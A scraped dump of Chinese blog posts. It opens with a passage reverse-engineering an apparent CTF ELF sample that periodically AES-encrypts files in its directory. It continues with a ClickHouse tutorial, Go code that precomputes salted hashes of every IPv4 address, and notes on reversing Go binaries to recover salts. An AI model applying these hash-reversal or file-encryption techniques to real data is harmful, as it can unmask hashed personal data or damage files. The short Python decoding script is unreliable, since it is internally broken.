此时补充完此图的全部位置，并标注其对应字符，可以得到，因此我们可以补全s1字符串为”Red{EV3ry_}” 接下来关注对全局变量0x263CC4的设置： 由图所示，可以很清楚的看到，这里将0x2680C7这个地址处对应的值（一个字节大小），经过符号扩展后赋值给了eax，再对eax+6，赋值给了全局变量0x26CC4，因此这里的0x2680C7就显得很重要。 进入查看，发现又位于.bss段，往上看刚好是s1字符串的起始处，又因为只有满足前7个字符相同这个条件才能走到这一步，因此可以直接拿7个字符先匹配过来，刚好对应地址0x2680C0~0x2680C6处的值，接下来的0x2680C7的值，根据前面推算，即字符”r”，其对应的十六进制值分别为0x72，再进行加6，可以确定全局变量0x263CC4地址处的值为0x78中的一个。至此sub_3BFAA函数部分分析完成，其核心功能是通过五皇后算法，设置了一个全局变量的值为0x78 init部分由于main函数中并没有实现对文件加密的功能，目光只能聚集到先于main调用的init和init_array，在执行ELF文件时，会优先调用init函数，以及init_array数组中的所有函数。下面开始分析init函数的部分： 通过对main函数进行xref（快捷键”X“），可以找到其上层函数_libc_start_main，这里可以看到init函数 进入init，前面是init_proc用于初始化进程没什么用；接下来是调用偏移0x238988处的一系列函数，实际上就是遍历init_array数组中的函数，依次进行调用。进入init_array数组，一共两个函数，依次点进去，发现sub_3B160没有做什么操作，因此只能关注函数sub_3B025了 进入函数sub_3B025，这里一共有2个函数，首先来看sub_3D2A6，该函数只做了一件事，设置sigaction结构体，将信号14的处理函数设置为sub_3D27B。两个__readfsqword没什么用，读取和校验canary的值，是检查栈溢出的。 再看sub_3D318，这个函数也只做了一件事，调用setitimer设置超时时间为600s，ITIMRE_REAL按实际时间计时，计时达到将给进程发送SIGALRM信号，即信号14。而信号14的回调函数在前面被设置为了sub_3D27B。所以，这个程序就会每10min调用一次sub_3D27B这个函数，重点也是这个函数。 进入sub_3D27B，情况如下： 首先判断地址0x263CA0处是否为空，这个地址同样位于.bss段，未经初始化，在执行init_array数组中的函数时肯定没有初始化，因为这个函数本身就是最早执行的。 因此进入sub_3D243查看。可以看到，这里根据先前的全局变量0x263CC4，计算出一个偏移值，这个值的范围在0~3之间，然后根据这个偏移在0x262020处的数组中（蓝色方框框出）找到特定函数地址（这是4个不同模式的AES加密函数），写入到0x263CA0开始的数组中。 由于我们已经在main部分确定了全局变量的值为0x78，因此数组0x263CA0存的顺序如下： [sub_3C6D5、sub_3C979、sub_3CACB、sub_3C827] 完成对数组的赋值工作后回到``sub_3D27B，接下来关注sub_3CD78`，该函数传递了一个参数，这个参数的值为0xFE 进入sub_3CD78， 这里先判断buf是否为空，一开始肯定是空的，所以需要调用sub_3CCD9，进入sub_3CCD9，如果buf为空，则会先为其分配空间，然后再调用sub_3CD78，这里需要注意一点，此时参数传递的是aW，进入查看，发现是一段写死的数据。 再回到sub_3CD78，由于已经为buf分配了空间。接下来会对0x2680A0地址是否有值进行判断，这是一个临时存放解码数据的缓冲区。第一次执行时同样不会有值，走else逻辑，进入蓝色方框区域 给0x2680A0开始的地址申请一块128字节的内存空间，然后将a1指向的字符串的值依次与0xE9进行异或运算，然后再保存到0x2680A0地址开始的内存空间中。注意一点，这里的a1的值不是0xFE，而是在sub_3CCD9中调用时传递的aW 编写简单的脚本进行解析，可以得到aW传递的字符串实际是/proc/self/exe。返回结果保存在v6， python1234567e1 = [0x57, 0xF0, 0xA2, 0x97, 0x6B, 0x57, 0xFB, 0x1D, 0x8C, 0x76, 0x57, 0x1D, 0xB8, 0x1D]for x in e1: s = str(hex(0xE9*x))[4:] res.append(chr(int(s, 16)))print(''.join(res)) 此时返回到sub_3CCD9中，在Linux中，/proc/self/exe是一个符号链接，代表当前程序。通过调用readlink读取它的源路径就可以获取当前程序的绝对路径。然后，通过一个循环，寻找绝对路径最后一个\\或者/之后的字符串，也就是程序自身的真实名字，将其保存在buf中 此时，从sub_3CCD9中回到sub_3CD78。可以发现，在buf为空的情况下，会调用sub_3CCD9初始化buf缓冲区，并赋值为当前程序名的字符串。此时，我只需要关心if部分，因为在先前sub_3CCD9中调用sub_3CD78后，地址0x2680A0处已经有值，存放的是proc/self/exe，此时， 先将0x2680A0中保存的值全部清除 打开自身程序读取前4个字节，ELF文件的前4个字节为.EFL，对应的ascii码为（0x7F，0x45，0x4C，0x46） 接下来用第2~4个字节相乘，取低字节再加1（刚好又是0xE9），然后与传入的a1字符串（此时为0xFE）进行异或，得到字符串.，也就是当前目录，然后返回 回到上层调用sub_3D27B，将刚刚分析的sub_3CD78改名为xorStringWith0xE9，然后进入分析sub_3D067的调用过程，参数传入为字符串\".\" 进入sub_3D067，这部分很简单，核心函数在后头，先梳理下流程： 调用sub_1B4960，该函数实际调用了_xstat用于获取文件属性，这些属性会保存在传入的stat_buf结构体中。然后通过st_mode字段判断是否为目录文件（第14位被置位，即0x4000）。这里传入的是字符串\".\"，表示当前目录 然后调用opendir打开当前目录，进入循环调用readdir遍历当前目录的所有文件；获取文件名，将其存入全局变量s1中（注意这里的s1和前面main函数中出现的s1指向的不是同一个地址），并筛选掉所有目录文件 调用sub_3CE9B，这个函数会判断文件名是否是.dp后缀，如果是的话，则会返回1；否则返回0，则会进入sub_3CFDA 进入sub_3CFDA，橙色方框的部分会将.dp附加到原文件名后面，然后将原文件名和修改后的文件名，作为参数传入sub_3CEF5 进入sub_3CEF5，这是最为关键的用于加密的函数，具体操作如下： 橙色方框：生成一个16字节的随机字符串，赋值给变量v5 蓝色方框：打开原始文件，读取内容到变量v7中 红色方框：打开新创建的文件，用于将原文件内容加密后写入，文件描述符赋给变量v8 粉色方框： 选则随机字符串的第4个字节，加上索引i（范围02，从0开始，每轮循环递增），再和3进行与操作，得到一个范围在03之间的随机数，赋值给变量v6 将v6作为索引，选择数组中存放的加密函数，数组中加密函数的排列如下所示： [sub_3C6D5、sub_3C979、sub_3CACB、sub_3C827] 将v7、v8、v5作为参数，调用从数组中选取的加密函数，进行三轮加密（每一轮需要重新在数组中选择加密函数，这些加密函数均为AES加密，但是加密模式不同）","categories":[],"tags":[{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"},{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}]},{"title":"Clickhouse环境搭建与基本使用","slug":"Clickhouse环境搭建与基本使用","date":"2019-03-01T15:29:49.000Z","updated":"2022-05-19T16:13:28.868Z","comments":true,"path":"2019/03/01/Clickhouse环境搭建与基本使用/","link":"","permalink":"http://cata1oc.github.io/2019/03/01/Clickhouse%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/","excerpt":"","text":"环境搭建下载安装包根据不同发行版Linux，从官方下载地址下载合适的安装包 安装顺序bash1234rpm -ivh clickhouse-common-static-20.3.11.97-1.el7.x86_64.rpmrpm -ivh clickhouse-server-common-20.3.11.97-1.el7.x86_64.rpmrpm -ivh clickhouse-server-20.3.11.97-1.el7.x86_64.rpmrpm -ivh clickhouse-client-20.3.11.97-1.el7.x86_64.rpm 创建目录路径随便选，IT给的服务器基本上磁盘都分给了/home，我就习惯安装在/home下 bash123456mkdir -p /home/app/clickhouse/logmkdir -p /home/app/clickhouse/datamkdir -p /home/app/clickhouse/data_oldmkdir -p /home/app/clickhouse/tmp/mkdir -p /home/app/clickhouse/format_schemas/mkdir -p /home/app/clickhouse/user_files/ 修改启动脚本进入vim /etc/init.d/clickhouse-server 修改以下参数 bash1234CLICKHOUSE_LOGDIR=/home/app/clickhouse/logCLICKHOUSE_LOGDIR_USER=rootCLICKHOUSE_DATADIR_OLD=/home/app/clickhouse/data_oldCLICKHOUSE_DATADIR=/home/app/clickhouse/data 修改配置文件进入vim /etc/clickhouse-server/config.xml修改一下路径 Code1234/home/app/clickhouse/data//home/app/clickhouse/tmp//home/app/clickhouse/user_files//home/app/clickhouse/format_schemas/ 启动和验证ClickHouse服务bash1234# 启动clickhouse服务service clickhouse-server start# 进入数据库交互模式clickhouse-client -m 添加开机自启动服务器一般不会关，不用考虑此选项 Code1chkconfig clickhouse-server on 基本操作建表 基本语法 sql123456CREATE TABLE [IF NOT EXISTS] [db.]table_name [ON CLUSTER cluster]( name1 [type1] [DEFAULT|MATERIALIZED|ALIAS expr1] [compression_codec] [TTL expr1], name2 [type2] [DEFAULT|MATERIALIZED|ALIAS expr2] [compression_codec] [TTL expr2], ...) ENGINE = engine; 示例1：创建了一张内存表，包含字段id和name，这里使用了Memory引擎。Memory引擎是ClickHouse最简单的表引擎，数据只会被保存在内存中，在服务重启时数据会丢失 sql1234CREATE TABLE table_test( id Int32, name String) ENGINE=Memory; 示例2：创建一个名为table_test的表，包含String类型的字段uid和md5hash(固定长度为32字节) sql12345678CREATE TABLE table_test( uid String, md5hash FixedString(32)) ENGINE = MergeTreeORDER BY md5hashSETTINGS index_granularity = 8192; Clickhouse支持多种不同的引擎，表引擎决定了数据表的特性，也决定了数据将会被如何存储及加载。以适用于不同数据量场景下的开发，具体可以参考此文；工作中我处理的数据量较大，因此示例选用了支持插入索引的表引擎MergeTree。关于稀疏索引的参数值8192的含义，可以参考此文 入库 普通插入 sql12345INSERT INTO table_test VALUES ( 'test', '098F6BCD4621D373CADE4E832627B4F6'); 插入csv文件中的数据（csv文件中的数据要按照建表时字段的顺序排列） bash1cat $f | clickhouse-client --query \"INSERT INTO table_test VALUES FORMAT CSV\" 查询 常规语法 sql1234SELECT * FROM table_testWHERE md5hashIN ('098F6BCD4621D373CADE4E832627B4F6'); 括号内查询的值可以有多个（测试同时容纳1000个没问题，且查询速度足够快），需用逗号隔开 SHOW操作以下是一些SHOW指令实现的操作，可用于查看不同信息 sql12345678910111213141516171819202122232425262728293031323334353637-- 查看建表信息SHOW CREATE [TEMPORARY] [TABLE | DICTIONARY] [db.]table [INTO OUTFILE filename] [FORMART format];-- 查看所有库SHOW DATABASES [INTO OUTFILE filename] [FORMAT format];SELECT name FROM system.databases [INTO OUTFILE filename] [FORMAT format];-- 查看当前服务操作进程SHOW PROCESSLIST;SELECT * FROM system.processes-- 查看所有表SHOW [TEMPORARY] TABLES [{FROM | IN} ] [LIKE ''|WHERE expr] [LIMIT ][INTO OUTFILE ][FORMAT ];SELECT name FROM system.tables WHERE database = [AND name LIKE ] [LIMIT ][INTO OUTFILE ][FORMAT ];-- 查看所有字典 + 示例SHOW DICTIONARIES [FROM ] [LIKE ''] [LIMIT ][INTO OUTFILE ][FORMAT ];SELECT name FROM system.dictionaries WHERE database = [AND name LIKE ] [LIMIT ][INTO OUTFILE ][FORMAT ];SHOW DICTIONAARIES FROM db LIKE '%reg%' LIMIT 2; -- 查看用户权限SHOW GRANTS [FOR user];-- 查看用户信息SHOW CREATE USER [name | CURRENT_USRR];-- 查看角色信息SHOW CREATE ROLE name;-- 查看row policy creation信息SHOW CREATE [ROW] POLICY name ON [db.]table;-- 查看 quota信息SHOW CREATE QUOTA [name | CURRENT]-- 查看settings profile creation信息SHOW CREATE [SETTINGS] PROFILE name; 参考链接 Clickhouse官网：Clickhouse官方下载地址 博客园：Clickhouse单机版的安装 CSDN：Clickhouse SHOW 查询操作 emacsist博客：为100亿内的数字建立md5彩虹表的数据仓库 CSDN：ClickHouse引擎介绍 简书：Clickhouse的稀疏索引以及”8192”的含义","categories":[],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://cata1oc.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"从代码中学习Go(一)","slug":"从代码中学习Go01","date":"2019-02-25T12:24:17.000Z","updated":"2022-05-22T17:08:06.225Z","comments":true,"path":"2019/02/25/从代码中学习Go01/","link":"","permalink":"http://cata1oc.github.io/2019/02/25/%E4%BB%8E%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%AD%A6%E4%B9%A0Go01/","excerpt":"","text":"前言前言是很重要的，前言可以知道，为什么要做这件事，为什么会有这篇博客。2月底到3月初的时候，进行某一个项目时，由于需要大量数据的运算与处理，Python速度过慢，而C写起来又很慢，为了效率（实在没效率），临时使用了静态编译的go语言来实现相应的功能需求，并在当时学习了一些go的基本使用手法。时间过了很久，很多当时学会的技巧也都忘的差不多了，本篇，本想着和shell篇一样，从源码的角度进行分析（本篇敏感字段仅有真实的Salt值，随便设置一个即可），以后对类似功能有需求时，可以有一些参考的价值。但又不完全一样，go不是shell，不是简单知道怎么用就行的。因此，本篇仅作为一个引导，并不会做到一个完全细致的分析。我会根据当时的需求，列出两份我之前写的能跑起来的代码（已脱敏），并罗列代码中用到的技术以及我当时查阅的一些资料。因为短期用不上Go，它也不是我主流使用的语言，并且大部分情况下，需要什么功能查询一下就好了，所以等到某一天，我又因为某些任务，开始编写go代码的时候，再将本篇的内容进行补充与扩展。建议以后进一步扩展文章内容时，先读完文末链接的2本书，并参考开源源码后，再进行适当补充。 需求分析需求a 给定特定的盐值 生成所有IPv4地址（42亿）与加盐哈希（使用sha256）后的对应关系 根据哈希值前2位，将对应关系存在相应的csv文件中 例如哈希值前2位为FF，则将对应关系存在255.csv中 从0.csv~255.csv，共建立256个相应的csv文件 需求b 给定特定的盐值 从给定的csv文件/json文件中读取域名 生成所有域名与加盐哈希（使用sha256）后的对应关系 进行需求a的3~5步 应用技术字符串操作 CSDN：golang strconv Atoi Itoa 例子 CSDN：golang 中 strings 包的 Replace 用法介绍 CSDN：Go strings.Split函数 Go语言中文网：strings包里面的Split函数的坑 简书：Go语言的string和byte slice之间的转换 Slicego12345678910111213141516171819// 结构定义:type slice struct { array unsafe.Pointer // 指向一个底层数组的指针 len int // 当前切片的长度 cap int // 当前切片的容量，满足cap >= len}// 特性：1. 切片(slice)和数组类似，也是表示一个有序元素，但这个序列的长度可变2. 切片是对底层数组一个连续片段的引用，所以是引用类型3. 切片内部实现的数据结构通过指针引用底层数组，设定相关属性将数据读写操作限定在指定的区域内4. 切片本身是一个只读对象，其工作机制类似数组指针的一种封装5. 多个切片可以指向同一个底层数组，实现了内存共享// 使用：mySlice := make([]type, len, cap) // 创建方式mySlice1 := make([]int, 5) // 长度为5，元素初始为0mySlice2 := make([]int, 5, 10) // 长度为5，元素初始为0，预留10个元素的空间mySlice3 := []int{10, 20, 30, 40, 50} // 长度为5，[]内不能写容量，否则就成了数组而不是切片了 Map 简书：Go内建函数make及切片slice、映射map详解 sync.map 博客园：深度解密Go语言之sync.map 反射 Go语言设计与实现：反射 The Go Programming Language：通过reflect.Value修改值 vimsky.com：reflect.New()用法及代码示例 Json解析 StackOverFLow：Go Unmarshal reflect.Type got map[string] interface{} 博客园：Go的Json解析-Marshal与Unmarshal 哈希计算 CSDN：Go sha256使用实例介绍 跨平台编译 知乎：Go交叉编译(跨平台编译) StackOverFlow：Go 1.7 Cross Compilation from Windows to Linux/Ubuntu 代码实现需求ago123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145package mainimport ( \"crypto/hmac\" \"crypto/sha256\" \"encoding/csv\" \"encoding/hex\" \"fmt\" \"os\" \"reflect\" \"strconv\" \"strings\" \"sync\")func fatal(e error) { if e != nil { panic(e) }}func calculate_hash(ip string) (ip_hash string) { key := \"AAAABBBBCCCCDDDDEEEE11112222333344445555++++----\" keyb := []byte(key) ipb := []byte(ip) mac := hmac.New(sha256.New, keyb) mac.Write(ipb) msgmac := mac.Sum(nil) hash_code := strings.ToUpper(hex.EncodeToString(msgmac)) // fmt.Printf(hash_code) return hash_code}func initial_syncmap(fp_map sync.Map) (ret_map sync.Map) { for i := 0; i","categories":[],"tags":[{"name":"Go","slug":"Go","permalink":"http://cata1oc.github.io/tags/Go/"}]},{"title":"初探Go逆向","slug":"初探Go逆向","date":"2019-02-17T12:41:50.000Z","updated":"2022-05-22T17:34:13.232Z","comments":true,"path":"2019/02/17/初探Go逆向/","link":"","permalink":"http://cata1oc.github.io/2019/02/17/%E5%88%9D%E6%8E%A2Go%E9%80%86%E5%90%91/","excerpt":"","text":"适用场景分析无壳、无混淆、纯Go编译的二进制程序 准备工作 IDA7.6及以上版本 用于IDA的Go解析脚本 静态分析思路（IDA辅助）关键字 Query： 用途：服务端的Web程序，通常具有查询数据库的功能，若源码未进行混淆，常会暴露出关键字 “Query” 获取方式：通过搜索关键字 “Query + 特定标识” （例如QueryAccount，QueryDatabase，QueryId）定位潜在的数据库查询函数，分析其伪代码，以还原数据的存储和查询过程 Salt： 用途：数据入库时进行加盐哈希，从而降低被撞库的风险 常见获取方式： 一种是已经初始化好，位于.data段中，通过搜索字符串 “Salt” 进行定位 另一种是尚未初始化，在.data段中存在一串字符串或某个常数，程序会按照设定算法随机从字符串中取出单个字符进行拼接，形成盐；或者将字符串中的每个字符转换为整型，依次对常数进行加减运算，得到新的数值后再根据ascii码转换回对应的字符，并拼接成字符串，形成最终的盐。 实战中，盐的生成方案需要根据实际情况确定，通常盐会出现在调用哈希函数前处理数据的部分，因此可先确定加密用的哈希函数，再回溯调用该哈希函数的上层函数，再对该上层函数进行分析 可能的用法： 将需要入库的数据与盐进行拼接，对拼接后的数据进行哈希运算 将盐作为加密密钥，再进行哈希运算将数据加密 伪代码Go函数的鉴别在执行了go程序分析脚本后，大部分函数均可解析出来，只需F5一键查看伪代码就可以。需要注意的是，这里解析出的函数通常是原生go函数的底层实现，虽然也是go写的，但是命名通常有所不同，来看下面的例子： 这个Demo进行了一些简单的字符串拼接、替换、分割的操作，并对字符串进行加盐哈希，这里主要关注红框框住的操作。接下来看看IDA中解析出来的伪代码： 可以看到解析出的伪代码，是go函数的底层实现，这部分底层实现的函数名，可以在对go程序进行调试时，从汇编中看到： 这些go函数的底层实现与其本身有着类似的函数名，从这个角度入手，即可猜到实际调用的go函数。 部分情况下，IDA解析不正确时，仍需要结合汇编进行判断，通常在创建一个slice时会使用make进行空间的分配，例如make([]string, 0, 5)，其中0代表当前slice的长度，5代表slice的容量，也就是最大长度。在本例中，只进行了字符串的拼接，而slice的拼接通常使用append函数在尾部附加，由于IDA会将append操作进行优化，实际显示出的是直接进行下标赋值： 也因此，在一些较为复杂的情况下，有些slice对append的操作，会被解析成slice.cap = 'xxxx'，此时IDA直接解析出了slice的cap属性，却将字符串以赋值的操作，赋给了cap属性。此时就要进一步查看汇编，分析给slice赋值的处的地址与前一个元素的地址是否连续来判断这个操作是否为字符串的拼接。更多的细节需要了解写屏障相关概念，这里不深究。 第三方库通常，在经过脚本解析后，可以比较清晰的看到 github_com_gin_gonic_gin_RouterGroup_Handle 补充4月12日，看雪论坛的一篇精华文章，详细介绍了在经过IDA脚本解析后的Go代码，该如何去分析其数据结构。当初，我就想写这么一篇文章，可惜没有这个时间和耐心去钻研。现在，有了这篇文章，就不需要我再去详细写了。因此这里，直接就附上了他文章的地址。以后复习到这里的时候，一定需要再把他的这篇文章看一看，复习复习！ 参考链接 Github：Go程序分析脚本 golang 中 strings 包的 Replace 用法介绍 看雪：Go解析","categories":[],"tags":[{"name":"Windows逆向","slug":"Windows逆向","permalink":"http://cata1oc.github.io/tags/Windows%E9%80%86%E5%90%91/"},{"name":"Go","slug":"Go","permalink":"http://cata1oc.github.io/tags/Go/"}]}]}